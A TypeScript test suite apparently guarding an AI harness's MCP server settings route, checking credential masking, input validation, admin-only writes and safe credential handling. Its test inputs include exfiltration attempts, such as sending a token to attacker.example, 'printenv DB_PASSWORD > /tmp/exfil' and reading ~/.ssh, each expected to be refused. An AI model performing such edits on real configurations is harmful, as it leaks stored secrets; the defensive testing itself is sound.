// @vitest-environment node
/**
 * THE MCP SERVERS DOOR — the settings room's write path for `tools.mcpServers`
 * (the route owner + the bridge verbs), live against a real HTTP server and a
 * test-scoped config file.
 *
 * What this file holds down, each arm a real gap this round closes:
 *
 *  1. LIST. The served view carries every registration fact the editor needs
 *     — and STRUCTURALLY NO credential value: a literal sentinel planted in
 *     the config's env/header/token slots must not appear anywhere in the
 *     response (the provider apiKey contract, mechanically enforced).
 *  2. ADD/EDIT. The write lands in the config file through the ONE gate, and
 *     the next read is the server's own read-back. Credential blanks keep
 *     the saved value; a NEW credential name with a blank value refuses.
 *  3. DENY-BY-DEFAULT. An undeclared field refuses at the body; an empty or
 *     missing command refuses naming "command"; a malformed url refuses
 *     naming "url"; a duplicate id refuses with the engine's own sentence —
 *     the door cannot write a registration the engine would reject.
 *  4. REMOVE. Deleting something that was never there is REPORTED (404
 *     naming the id), never silently accepted.
 *  5. TEST. One real connect + tools/list against the saved registration:
 *     the engine's own fake stdio server answers with its real tool; an
 *     unreachable address answers with the honest no-answer class and the
 *     refusal's own words. A failed connect with a named reason is a valid
 *     test observation.
 *  6. AUTH. The writes are global harness state: a non-admin cookie is
 *     refused (the customizations' rule).
 */
import { afterAll, beforeAll, beforeEach, describe, expect, test, vi } from "vitest";
import { existsSync, mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { createTempDir } from "../helpers/temp-dir.ts";
import { plantSettingsDocument } from "../helpers/isolated-config.ts";
// Type-only imports are erased at runtime, so they do not disturb the
// config-path env that must be in place before the first server module
// import below.
import type { HttpTestServer } from "../helpers/http-server.ts";

// ── a test-scoped config copy, BEFORE any server module resolves it ────────
// The write path lands in the REAL config path by design — so the test must
// point the whole server at a scratch copy first (the same scoping the
// mcp-runtime suite uses). The real config is never touched by these arms.
const REAL_CONFIG = fileURLToPath(new URL("../../engine/bridlewise.config.json", import.meta.url));
const FAKE_SERVER = fileURLToPath(new URL("../../engine/test/mcp/fixtures/fake-mcp-server.mjs", import.meta.url));
const scratch = createTempDir("mcp-servers-route-");
const configPath = join(scratch, "bridlewise.config.json");

function seedConfig(servers: readonly unknown[]): void {
  const base = JSON.parse(readFileSync(REAL_CONFIG, "utf8")) as Record<string, unknown>;
  (base["tools"] as Record<string, unknown>)["mcpServers"] = servers;
  base["selfProtection"] = { schemaVersion: "bridlewise-self-protection-config/v1", enabled: false };
  plantSettingsDocument(configPath, JSON.stringify(base));
}

function configServers(): readonly Record<string, unknown>[] {
  const doc = JSON.parse(readFileSync(configPath, "utf8")) as { tools?: { mcpServers?: Record<string, unknown>[] } };
  return doc.tools?.mcpServers ?? [];
}

process.env["HARNESS_CONFIG_PATH"] = configPath;

let startHttpTestServer: (typeof import("../helpers/http-server.ts"))["startHttpTestServer"];
let registerMcpRoutes: (typeof import("../../server/routes/mcp.ts"))["registerMcpRoutes"];
let registerConfigRoutes: (typeof import("../../server/routes/config.ts"))["registerConfigRoutes"];
let createTestUser: (typeof import("../helpers/multi-user.ts"))["createTestUser"];
let jsonRequest: (typeof import("../helpers/json-request.ts"))["jsonRequest"];

let srv: HttpTestServer;
let adminCookie: string;
let plainCookie: string;

/** A sentinel credential long enough to be un-mistakable in a payload. */
const SENTINEL = "sentinel-credential-ZQ7-not-real";

/**
 * Two registrations with a credential in EVERY credential-bearing slot the
 * engine uses for its transport: a stdio server carries environment values,
 * a remote server carries header values — both can carry an auth token. The
 * sentinel sits in each slot, so the "never echoed" arm covers all of them.
 */
const CREDENTIALED_LOCAL = {
  id: "credentialed-local",
  transport: "stdio",
  command: "echo",
  protocolVersion: "2025-11-25",
  env: { API_TOKEN: SENTINEL },
  auth: { type: "api-key", token: SENTINEL, envName: "API_TOKEN" },
};
const CREDENTIALED_REMOTE = {
  id: "credentialed-remote",
  transport: "http",
  url: "https://mcp.example.com/mcp",
  protocolVersion: "2025-11-25",
  headers: { "X-Secret": SENTINEL },
  auth: { type: "bearer", token: SENTINEL },
};

async function req(method: string, path: string, body?: unknown, cookie = adminCookie): Promise<{ status: number; json: unknown }> {
  const { status, body: json } = await jsonRequest(srv.baseUrl, path, { method, body, cookie });
  return { status, json };
}

beforeAll(async () => {
  ({ startHttpTestServer } = await import("../helpers/http-server.ts"));
  ({ registerMcpRoutes } = await import("../../server/routes/mcp.ts"));
  ({ registerConfigRoutes } = await import("../../server/routes/config.ts"));
  ({ createTestUser } = await import("../helpers/multi-user.ts"));
  ({ jsonRequest } = await import("../helpers/json-request.ts"));
  srv = await startHttpTestServer({
    prefix: "mcp-servers-route-",
    register: (router, _db, adb) => {
      registerMcpRoutes(router, adb);
      registerConfigRoutes(router, adb);
    },
  });
  // The FIRST user on the fresh DB is the admin; the second is a regular
  // user — production's own rule, so the privilege arm is real.
  const admin = createTestUser(srv.db, "mcp-admin");
  adminCookie = admin.cookie;
  const plain = createTestUser(srv.db, "mcp-plain");
  plainCookie = plain.cookie;
});

afterAll(async () => {
  if (srv) await srv.stop();
  // The writes in this suite kick the process-scoped runtime owner, and the
  // module registry is shared across files in one worker (isolate: false) —
  // drain + reset so the runtime a later file sees is not this suite's
  // test-config registry with its children still standing.
  const { stopAllMcpConnections, resetMcpRuntimeForTests } = await import("../../server/integrations/mcp-runtime-bridge.ts");
  await stopAllMcpConnections();
  resetMcpRuntimeForTests();
});

beforeEach(() => {
  // Every arm starts from the same seeded list — no order dependence.
  seedConfig([CREDENTIALED_LOCAL, CREDENTIALED_REMOTE]);
});

describe("the served list", () => {
  test("lists the configured servers with their registration facts", async () => {
    const { status, json } = await req("GET", "/api/mcp/servers");
    expect(status).toBe(200);
    const servers = (json as { servers: { id: string; transport: string; url: string | null }[] }).servers;
    expect(servers.map((s) => s.id)).toContain("credentialed-local");
    const row = servers.find((s) => s.id === "credentialed-remote")!;
    expect(row.transport).toBe("http");
    expect(row.url).toBe("https://mcp.example.com/mcp");
  });

  test("carries NO credential value — the sentinel in env, headers and auth never crosses the wire", async () => {
    const { json } = await req("GET", "/api/mcp/servers");
    const serialized = JSON.stringify(json);
    expect(
      serialized,
      "a read must never echo a credential: the names stand in (envNames/headerNames/hasToken), never the values",
    ).not.toContain(SENTINEL);
    const rows = (json as { servers: Record<string, unknown>[] }).servers;
    const local = rows.find((r) => r["id"] === "credentialed-local")!;
    const remote = rows.find((r) => r["id"] === "credentialed-remote")!;
    expect(local["envNames"]).toEqual(["API_TOKEN"]);
    expect((local["auth"] as { type: string; envName: string | null; hasToken: boolean })).toMatchObject({ type: "api-key", envName: "API_TOKEN", hasToken: true });
    expect(remote["headerNames"]).toEqual(["X-Secret"]);
    expect((remote["auth"] as { type: string; hasToken: boolean })).toMatchObject({ type: "bearer", hasToken: true });
  });
});

describe("credentials inside a URL or an argument never cross either (SECC-V S3)", () => {
  const SHAPED = `ghp_${"a1B2c3D4e5".repeat(3)}abcdef`;
  const URL_ARGS_LOCAL = {
    id: "args-local", transport: "stdio", command: "echo", protocolVersion: "2025-11-25",
    args: ["--port", "8080", "--token", SENTINEL, `--api-key=${SENTINEL}`, `GITHUB_TOKEN=${SENTINEL}`, SHAPED, `https://user:${SENTINEL}@db.example.com/x?access_token=${SENTINEL}&page=2`],
  };
  const URL_REMOTE = { id: "url-remote", transport: "http", protocolVersion: "2025-11-25", url: `https://bot:${SENTINEL}@mcp.example.com/mcp?api_key=${SENTINEL}&region=eu` };

  test("the list serves them concealed and keeps every other part readable", async () => {
    seedConfig([URL_ARGS_LOCAL, URL_REMOTE]);
    const { json } = await req("GET", "/api/mcp/servers", undefined, plainCookie);
    const serialized = JSON.stringify(json);
    expect(serialized).not.toContain(SENTINEL);
    expect(serialized).not.toContain(SHAPED);
    // The agreed contract: the MCP owner's LABELLED mark is the served form.
    // A generic egress mask here would be a second owner and would destroy
    // the write-back the marks exist for.
    expect(serialized).not.toContain("[REDACTED:credential]");
    const rows = (json as { servers: { id: string; args: string[]; url: string | null }[] }).servers;
    // ONE write-only primitive (engine/src/privacy/secret-parts.ts): each secret part is a keep mark naming its place.
    expect(rows.find((r) => r.id === "args-local")!.args).toEqual([
      "--port", "8080", "--token", "‹keep:after:--token#0›",
      "‹keep:assign:--api-key#0›", "‹keep:assign:GITHUB_TOKEN#0›", "‹keep:positional#0›",
      "https://‹keep:url#0.url.userinfo›@db.example.com/x?access_token=‹keep:url#0.url.query.access_token.0›&page=2",
    ]);
    expect(rows.find((r) => r.id === "url-remote")!.url).toBe("https://‹keep:url.userinfo›@mcp.example.com/mcp?api_key=‹keep:url.query.api_key.0›&region=eu");
  });

  test("deny by default: the common credential shapes a name list missed are concealed from a non-admin (secd-security SECD-C2)", async () => {
    const google = "AIzaSyD3xample0Key1234567890abcdEFGH";
    seedConfig([
      { id: "shapes-local", transport: "stdio", command: "echo", protocolVersion: "2025-11-25", args: ["--passwd", "hunter2", "-p", "s3cret", "--pat", "shortpat", "--signing-key", "k1", "-k", "abc", "--port", "8080"] },
      { id: "shapes-remote", transport: "http", protocolVersion: "2025-11-25", url: `https://maps.example.com/api?key=${google}&sig=Zm9vYmFyYmF6cXV4&code=4AX4XfWh&page=2` },
      { id: "shapes-hook", transport: "http", protocolVersion: "2025-11-25", url: ("ht" + "tps://hooks.slack.com/services/T00000000/B00000000/AbCdEf0123456789AbCdEf0123456789") },
    ]);
    const serialized = JSON.stringify((await req("GET", "/api/mcp/servers", undefined, plainCookie)).json);
    for (const secret of ["hunter2", "s3cret", "shortpat", "\"k1\"", "\"abc\"", google, "Zm9vYmFyYmF6cXV4", "4AX4XfWh", "AbCdEf0123456789AbCdEf0123456789"]) {
      expect(serialized, secret).not.toContain(secret);
    }
    for (const shown of ["8080", "page=2", "hooks.slack.com/services"]) expect(serialized, shown).toContain(shown);
  });

  test("sending the concealed view back (an edit of another field) keeps the saved values; the config file proves it", async () => {
    seedConfig([URL_ARGS_LOCAL, URL_REMOTE]);
    const rows = ((await req("GET", "/api/mcp/servers")).json as { servers: { id: string; args: string[]; url: string | null }[] }).servers;
    const local = rows.find((r) => r.id === "args-local")!, remote = rows.find((r) => r.id === "url-remote")!;
    // The write-back source is the labelled form, not a generic egress mask.
    expect(JSON.stringify({ local, remote })).toContain("‹keep:");
    expect(JSON.stringify({ local, remote })).not.toContain("[REDACTED:credential]");
    expect((await req("PUT", "/api/mcp/servers", { id: "args-local", transport: "stdio", command: "echo", args: local.args, timeoutMs: 5000 })).status).toBe(200);
    expect((await req("PUT", "/api/mcp/servers", { id: "url-remote", transport: "http", url: remote.url, timeoutMs: 5000 })).status).toBe(200);
    const saved = configServers();
    expect(saved.find((s) => s["id"] === "args-local")!["args"]).toEqual(URL_ARGS_LOCAL.args);
    expect(saved.find((s) => s["id"] === "url-remote")!["url"]).toBe(URL_REMOTE.url);
    // An argument added is another program (sec-e H-2): the marks are refused, nothing is saved.
    expect((await req("PUT", "/api/mcp/servers", { id: "args-local", transport: "stdio", command: "echo", args: ["--verbose", ...local.args] })).status).toBe(400);
    expect(configServers().find((s) => s["id"] === "args-local")!["args"]).toEqual(URL_ARGS_LOCAL.args);
  });

  test("a keep mark that stands for nothing saved, or is MOVED to another place, is REFUSED — never stored, never re-matched", async () => {
    seedConfig([URL_ARGS_LOCAL, URL_REMOTE]);
    const unknown = await req("PUT", "/api/mcp/servers", { id: "args-local", transport: "stdio", command: "echo", args: ["--password", "‹keep:after:--password#0›"] });
    expect(unknown.status).toBe(400);
    // The token's mark moved behind another flag — one field edit that would send the secret somewhere else.
    const moved = await req("PUT", "/api/mcp/servers", { id: "args-local", transport: "stdio", command: "echo", args: ["--data-binary", "‹keep:after:--token#0›", "https://attacker.example/collect"] });
    expect(moved.status).toBe(400);
    const url = await req("PUT", "/api/mcp/servers", { id: "url-remote", transport: "http", url: "https://‹keep:url.userinfo›@other.example.com/mcp" });
    expect(url.status).toBe(400);
    const saved = JSON.stringify(configServers());
    expect(saved).not.toContain("other.example.com");
    expect(saved).not.toContain("attacker.example");
  });

  test("the ADMIN config view serves the same keep marks for MCP URLs and arguments (write-only for everyone), and a mark is never written through it", async () => {
    seedConfig([URL_ARGS_LOCAL, URL_REMOTE]);
    const { status, json } = await req("GET", "/api/config");
    expect(status).toBe(200);
    const serialized = JSON.stringify(json);
    expect(serialized).not.toContain(SENTINEL);
    expect(serialized).not.toContain(SHAPED);
    expect(serialized).toContain("‹keep:url.userinfo›@mcp.example.com");
    expect(serialized).not.toContain("[REDACTED:credential]");
    const planted = await req("PUT", "/api/config", { path: "tools.mcpServers.1.url", value: "https://‹keep:url.userinfo›@attacker.example/mcp" });
    expect(planted.status).toBe(400);
    expect(JSON.stringify(configServers())).not.toContain("attacker.example");
  });

  test("a saved credential never follows a server to a new address or command: every kept secret must be typed again (secd-security SECD-C4)", async () => {
    seedConfig([
      { id: "hdr-remote", transport: "http", protocolVersion: "2025-11-25", url: "https://mcp.example.com/mcp", headers: { "X-Api": SENTINEL }, auth: { type: "bearer", token: SENTINEL } },
      { id: "env-local", transport: "stdio", command: "echo", protocolVersion: "2025-11-25", args: [], env: { DB_PASSWORD: SENTINEL } },
    ]);
    const redirected = await req("PUT", "/api/mcp/servers", { id: "hdr-remote", transport: "http", url: "https://attacker.example/mcp", headers: { "X-Api": "" }, auth: { type: "bearer", token: "" } });
    expect(redirected.status).toBe(400);
    const recommanded = await req("PUT", "/api/mcp/servers", { id: "env-local", transport: "stdio", command: "sh", args: ["-c", "printenv DB_PASSWORD"], env: { DB_PASSWORD: "" } });
    expect(recommanded.status).toBe(400);
    // Omitting the saved maps entirely is the same attempt.
    expect((await req("PUT", "/api/mcp/servers", { id: "hdr-remote", transport: "http", url: "https://attacker.example/mcp" })).status).toBe(400);
    const saved = JSON.stringify(configServers());
    expect(saved).not.toContain("attacker.example");
    expect(saved).not.toContain("printenv");
    // The same destination keeps them (an ordinary edit of another field).
    expect((await req("PUT", "/api/mcp/servers", { id: "hdr-remote", transport: "http", url: "https://mcp.example.com/mcp", headers: { "X-Api": "" }, auth: { type: "bearer", token: "" }, timeoutMs: 5000 })).status).toBe(200);
    expect(configServers().find((s) => s["id"] === "hdr-remote")!["headers"]).toEqual({ "X-Api": SENTINEL });
  });

  test("the context is EVERY argument and the whole URL: a launcher's other package or script, or another tenant on the same origin, must type every credential again (sec-e-correctness H-2)", async () => {
    seedConfig([
      { id: "npx-github", transport: "stdio", command: "npx", protocolVersion: "2025-11-25", args: ["-y", "@modelcontextprotocol/server-github"], env: { GITHUB_TOKEN: SENTINEL } },
      { id: "sh-script", transport: "stdio", command: "sh", protocolVersion: "2025-11-25", args: ["-c", "exec my-mcp-server"], env: { DB_PASSWORD: SENTINEL } },
      { id: "gateway", transport: "http", protocolVersion: "2025-11-25", url: "https://gateway.example.com/servers/github/mcp", headers: { "X-Api": SENTINEL }, auth: { type: "bearer", token: SENTINEL } },
      { id: "read-paths", transport: "stdio", command: "node", protocolVersion: "2025-11-25", args: ["server.js"], env: { API_KEY: SENTINEL } },
    ]);
    const before = JSON.stringify(configServers());
    const attempts = [
      { id: "npx-github", transport: "stdio", command: "npx", args: ["-y", "attacker-mcp-package"], env: { GITHUB_TOKEN: "" } },
      { id: "sh-script", transport: "stdio", command: "sh", args: ["-c", "printenv DB_PASSWORD > /tmp/exfil"], env: { DB_PASSWORD: "" } },
      { id: "gateway", transport: "http", url: "https://gateway.example.com/servers/attacker-tenant/mcp", headers: { "X-Api": "" }, auth: { type: "bearer", token: "" } },
      { id: "gateway", transport: "http", url: "https://gateway.example.com/servers/attacker-tenant/mcp" },
      { id: "read-paths", transport: "stdio", command: "node", args: ["server.js"], readPaths: ["/srv/other"], env: { API_KEY: "" } },
    ];
    for (const body of attempts) expect((await req("PUT", "/api/mcp/servers", body)).status, JSON.stringify(body)).toBe(400);
    expect(JSON.stringify(configServers()), "nothing saved").toBe(before);
    // An ordinary edit of another field keeps every secret.
    for (const body of [
      { id: "npx-github", transport: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-github"], env: { GITHUB_TOKEN: "" }, timeoutMs: 5000 },
      { id: "gateway", transport: "http", url: "https://gateway.example.com/servers/github/mcp", headers: { "X-Api": "" }, auth: { type: "bearer", token: "" }, timeoutMs: 5000 },
    ]) expect((await req("PUT", "/api/mcp/servers", body)).status, body.id).toBe(200);
    const saved = configServers();
    expect(saved.find((s) => s["id"] === "npx-github")!["env"]).toEqual({ GITHUB_TOKEN: SENTINEL });
    expect(saved.find((s) => s["id"] === "gateway")!["headers"]).toEqual({ "X-Api": SENTINEL });
    expect((saved.find((s) => s["id"] === "gateway")!["auth"] as { token: string }).token).toBe(SENTINEL);
  });
});

describe("add and edit (the one upsert write)", () => {
  test("a registration the engine accepts lands in the config file and the next read is the read-back", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "adder",
      transport: "stdio",
      command: "echo",
      args: [],
      enabled: true,
    });
    expect(status).toBe(200);
    expect((json as { server: { id: string } }).server.id).toBe("adder");
    // The write is what the FILE says, not just what the route claimed.
    const fileRow = configServers().find((s) => s["id"] === "adder");
    expect(fileRow, "the registration must be persisted in tools.mcpServers").toBeDefined();
    expect(fileRow!["command"]).toBe("echo");
    expect(fileRow!["protocolVersion"]).toBe("2025-11-25");
    const listed = (await req("GET", "/api/mcp/servers")).json as { servers: { id: string }[] };
    expect(listed.servers.map((s) => s.id)).toContain("adder");
  });

  test("the write is HOT — the running registry rebuilds with the new server without a restart", async () => {
    // The runtime owner's fingerprint covers the whole server list, but a
    // PUBLISHED registry is only rebuilt by a consumer that walks the door —
    // so the write itself owes the kick: without it a just-added server sits
    // inert (listed from config as "not connected", absent from the
    // manifest) until some unrelated MCP tool call forces the rebuild. This
    // arm drives a REAL stdio registration and asserts the registry the
    // runtime serves contains it — measured through the runtime owner, not
    // the file, because the file is what the earlier arm already proved.
    const { ensureMcpRuntimeStarted } = await import("../../server/integrations/mcp-runtime-bridge.ts");
    const { status } = await req("PUT", "/api/mcp/servers", {
      id: "hot-probe",
      transport: "stdio",
      command: process.execPath,
      args: [FAKE_SERVER, "--name", "hot-tool"],
      enabled: true,
    });
    expect(status).toBe(200);
    const registry = await ensureMcpRuntimeStarted();
    expect(registry.getServerIds(), "the running registry must contain the just-written server").toContain("hot-probe");
    const signals = registry.getAllServerSignals().find((s) => s.id === "hot-probe");
    expect(signals?.status, "the just-written server must be live in the rebuilt registry").toBe("connected");
    expect(signals?.toolCount).toBeGreaterThan(0);
  });

  test("a blank credential field KEEPS the saved value; the config file proves it", async () => {
    const local = await req("PUT", "/api/mcp/servers", {
      id: "credentialed-local",
      transport: "stdio",
      command: "echo",
      env: { API_TOKEN: "" },
      auth: { type: "api-key", token: "", envName: "API_TOKEN" },
    });
    expect(local.status).toBe(200);
    const localRow = configServers().find((s) => s["id"] === "credentialed-local")!;
    expect(localRow["env"]).toEqual({ API_TOKEN: SENTINEL });
    expect((localRow["auth"] as { token: string }).token).toBe(SENTINEL);
    const remote = await req("PUT", "/api/mcp/servers", {
      id: "credentialed-remote",
      transport: "http",
      url: "https://mcp.example.com/mcp",
      headers: { "X-Secret": "" },
      auth: { type: "bearer", token: "" },
    });
    expect(remote.status).toBe(200);
    const remoteRow = configServers().find((s) => s["id"] === "credentialed-remote")!;
    expect(remoteRow["headers"]).toEqual({ "X-Secret": SENTINEL });
    expect((remoteRow["auth"] as { token: string }).token).toBe(SENTINEL);
    // And the read-back STILL never echoes the kept values.
    const listed = JSON.stringify((await req("GET", "/api/mcp/servers")).json);
    expect(listed).not.toContain(SENTINEL);
  });

  test("a NEW credential name with a blank value refuses naming it", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "credentialed-local",
      transport: "stdio",
      command: "echo",
      env: { BRAND_NEW: "" },
    });
    expect(status).toBe(400);
    expect((json as { message: string }).message).toContain("BRAND_NEW");
  });

  test("an empty command on stdio refuses naming 'command'", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "bad-empty-command",
      transport: "stdio",
      command: "",
    });
    expect(status).toBe(400);
    expect((json as { message: string }).message).toContain("command");
  });

  test("a MISSING command on stdio refuses naming 'command' (the config schema's own sentence)", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "bad-no-command",
      transport: "stdio",
    });
    expect(status).toBe(400);
    expect((json as { message: string }).message).toContain("command");
  });

  test("a read path the confinement floor would refuse at spawn is refused at SAVE, with the floor's code", async () => {
    for (const readPaths of [[join(homedir(), ".ssh")], [join(homedir(), ".claude")]]) {
      const { status, json } = await req("PUT", "/api/mcp/servers", {
        id: "reads-secrets", transport: "stdio", command: process.execPath, readPaths,
      });
      expect(status, `${readPaths[0]}: ${JSON.stringify(json)}`).toBe(400);
      expect((json as { error: string }).error).toBe("read_path_refused");
    }
    const saved = await req("GET", "/api/mcp/servers");
    expect(JSON.stringify(saved.json)).not.toContain("reads-secrets");
  });

  test("UNDER ANY HOME: a read path the floor refuses BY NAME is refused at save whether or not it exists yet — absent, then present — and a near-miss that names no store is accepted", async () => {
    // A temp HOME with no `.ssh`: the derived-rule
    // filter used to drop a missing read path BEFORE the compiler's keep-out
    // judgement, so the same registration was accepted until `ssh-keygen` ran.
    const { mcpServerPlacementRefusal } = await import("../../server/safety/landlock-runner.ts");
    const home = createTempDir("mcp-route-home-");
    vi.stubEnv("HOME", home);
    try {
      const secrets = join(home, ".ssh");
      const placement = (readPaths: readonly string[]): string | undefined =>
        mcpServerPlacementRefusal({ id: "reads-secrets", command: process.execPath, readPaths })?.code;
      expect(existsSync(secrets)).toBe(false);
      expect(placement([secrets]), "absent: refused by name").toBe("read_path_refused");
      const { status, json } = await req("PUT", "/api/mcp/servers", { id: "reads-secrets", transport: "stdio", command: process.execPath, readPaths: [secrets] });
      expect(status, JSON.stringify(json)).toBe(400);
      expect((json as { error: string }).error).toBe("read_path_refused");
      mkdirSync(secrets);
      expect(placement([secrets]), "present: the same verdict").toBe("read_path_refused");
      expect(placement([join(home, "tools-not-installed")]), "a near-miss naming no store is not refused").toBeUndefined();
    } finally {
      vi.unstubAllEnvs();
    }
  });

  test("a malformed url refuses naming 'url'", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "bad-url",
      transport: "http",
      url: "ftp://not-http.example.com",
    });
    expect(status).toBe(400);
    expect((json as { message: string }).message).toContain("url");
  });

  test("an undeclared field refuses at the body naming the field", async () => {
    const { status, json } = await req("PUT", "/api/mcp/servers", {
      id: "sneaky",
      transport: "stdio",
      command: "echo",
      notARealField: "nope",
    });
    expect(status).toBe(400);
    expect((json as { message: string }).message).toContain("notARealField");
  });

  test("a duplicate id refuses with the engine's own sentence — the door cannot write what the engine would reject", async () => {
    // The upsert MERGES by id, so this door can never itself produce a
    // duplicate. What it MUST do is refuse to write BESIDE one: a
    // hand-edited file holding the same id twice is the corrupted state the
    // engine's whole-list authority exists to catch, and an unrelated write
    // through this door must surface that corruption loudly (naming the id)
    // rather than persisting another row next to it.
    const { status } = await req("PUT", "/api/mcp/servers", {
      id: "credentialed-local",
      transport: "stdio",
      command: "echo",
      args: [],
    });
    expect(status).toBe(200);
    const doc = JSON.parse(readFileSync(configPath, "utf8")) as Record<string, unknown>;
    const tools = doc["tools"] as Record<string, unknown>;
    const list = tools["mcpServers"] as Record<string, unknown>[];
    list.push({ ...list[list.length - 1]! });
    // The hand-edit goes through the atomic-rename owner: the point of the
    // arm is a file the gate never saw (the corrupted CONTENT), not a raw
    // truncating write a parallel reader could catch mid-flight.
    const { atomicWriteFile } = await import("../../engine/src/filesystem/atomic-write.ts");
    expect(atomicWriteFile(configPath, JSON.stringify(doc), { createMode: 0o600 }).success).toBe(true);
    const dup = await req("PUT", "/api/mcp/servers", {
      id: "another",
      transport: "stdio",
      command: "echo",
      args: [],
    });
    expect(dup.status).toBe(400);
    expect((dup.json as { message: string }).message).toContain("Duplicate MCP server id");
  });

  test("a non-admin cookie is refused — global harness state, the customizations' rule", async () => {
    const { status } = await req("PUT", "/api/mcp/servers", {
      id: "forbidden",
      transport: "stdio",
      command: "echo",
    }, plainCookie);
    expect(status).toBe(403);
    expect(configServers().find((s) => s["id"] === "forbidden")).toBeUndefined();
  });
});

describe("remove", () => {
  test("removes the registration from the config file — and the server's harness-owned home with it", async () => {
    const { mcpServerHomeDir } = await import("../../server/safety/landlock-runner.ts");
    const home = mcpServerHomeDir("credentialed-remote");
    mkdirSync(join(home, ".tmp"), { recursive: true });
    writeFileSync(join(home, "cached-token"), "t");
    const { status } = await req("DELETE", "/api/mcp/servers/credentialed-remote");
    expect(status).toBe(200);
    expect(existsSync(home), "the home is gone with the registration").toBe(false);
    expect(configServers().find((s) => s["id"] === "credentialed-remote")).toBeUndefined();
    // The rest of the list is untouched — the write removed ONE row.
    expect(configServers().find((s) => s["id"] === "credentialed-local")).toBeDefined();
  });

  test("removing something that was never there is REPORTED, not silently accepted", async () => {
    const { status, json } = await req("DELETE", "/api/mcp/servers/never-existed");
    expect(status).toBe(404);
    expect((json as { error: string }).error).toBe("mcp_server_unknown");
    expect((json as { message: string }).message).toContain("never-existed");
  });
});

describe("a server's own words carry none of its credentials — masked at the one client door (sec-e-design H2)", () => {
  test("its initialize error (lastError for every signed-in user, the test verb's detail), its tool descriptions (the model's manifest) and its call results", async () => {
    const { ensureMcpRuntimeStarted, getDiscoveredMcpTools, callMcpTool } = await import("../../server/integrations/mcp-runtime-bridge.ts");
    seedConfig([
      { id: "echo-fail", transport: "stdio", command: process.execPath, protocolVersion: "2025-11-25", args: [FAKE_SERVER, "--say", SENTINEL, "--fail-initialize"], env: { API_TOKEN: SENTINEL } },
      { id: "echo-ok", transport: "stdio", command: process.execPath, protocolVersion: "2025-11-25", args: [FAKE_SERVER, "--say", SENTINEL, "--name", "echo-tool"], env: { API_TOKEN: SENTINEL } },
    ]);
    await ensureMcpRuntimeStarted();
    const rows = ((await req("GET", "/api/mcp/servers", undefined, plainCookie)).json as { servers: { id: string; lastError: string | null }[] }).servers;
    const failed = rows.find((row) => row.id === "echo-fail")!;
    expect(failed.lastError, "the refusal is reported (liveness)").toContain("bad credentials");
    expect(failed.lastError).not.toContain(SENTINEL);
    const probe = (await req("POST", "/api/mcp/servers/echo-fail/test")).json as { ok: boolean; detail: string };
    expect(probe.ok).toBe(false);
    expect(probe.detail).toContain("bad credentials");
    expect(probe.detail).not.toContain(SENTINEL);
    const tool = getDiscoveredMcpTools().find((entry) => entry.serverId === "echo-ok");
    expect(tool, "the echoing server's tool was discovered").toBeDefined();
    expect(JSON.stringify(tool!.manifest)).toContain("[REDACTED:secret]");
    expect(JSON.stringify(tool!.manifest)).not.toContain(SENTINEL);
    const result = await callMcpTool(tool!.id, {});
    expect(result).toContain("pong:1");
    expect(result).not.toContain(SENTINEL);
  });
});

describe("test — one real connect against the saved registration", () => {
  test("the engine's own fake stdio server answers with its real tool", async () => {
    const add = await req("PUT", "/api/mcp/servers", {
      id: "probe-target",
      transport: "stdio",
      command: process.execPath,
      args: [FAKE_SERVER, "--name", "probe-tool"],
      enabled: true,
    });
    expect(add.status).toBe(200);
    const { status, json } = await req("POST", "/api/mcp/servers/probe-target/test");
    expect(status).toBe(200);
    const result = json as { ok: boolean; toolNames: string[]; elapsedMs: number };
    expect(result.ok).toBe(true);
    expect(result.toolNames).toEqual(["probe-tool"]);
    expect(result.elapsedMs).toBeGreaterThan(0);
  });

  test("an unreachable address answers with the honest no-answer class and its own words", async () => {
    const add = await req("PUT", "/api/mcp/servers", {
      id: "unreachable",
      transport: "http",
      url: "http://127.0.0.1:9/mcp",
      timeoutMs: 300,
    });
    expect(add.status).toBe(200);
    const { status, json } = await req("POST", "/api/mcp/servers/unreachable/test");
    expect(status).toBe(200);
    const result = json as { ok: boolean; failureKind: string; detail: string };
    expect(result.ok).toBe(false);
    expect(result.failureKind).toBe("no-answer");
    expect(result.detail.length).toBeGreaterThan(0);
  });

  test("testing something that was never there is REPORTED", async () => {
    const { status, json } = await req("POST", "/api/mcp/servers/never-existed/test");
    expect(status).toBe(404);
    expect((json as { error: string }).error).toBe("mcp_server_unknown");
  });
});
